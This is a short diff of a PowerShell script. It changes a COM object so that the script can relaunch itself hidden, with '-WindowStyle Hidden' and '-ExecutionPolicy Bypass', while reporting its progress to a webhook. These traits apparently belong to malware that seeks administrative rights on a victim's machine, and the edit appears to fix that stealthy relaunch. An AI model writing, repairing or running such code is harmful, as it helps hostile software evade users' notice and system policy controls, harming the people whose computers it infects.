@@ -26,7 +26,7 @@ try {
         } else {
             Send-WebhookMessage -Message 'Requesting administrative privileges...'
             try {
-                $shell = New-Object -ComObject Shell.Application
+                $shell = New-Object -ComObject "WScript.Shell"
                 $shell.Run('powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "' + $PSCommandPath + '"', 0, $false)
                 Start-Sleep -Seconds 3
             } catch {
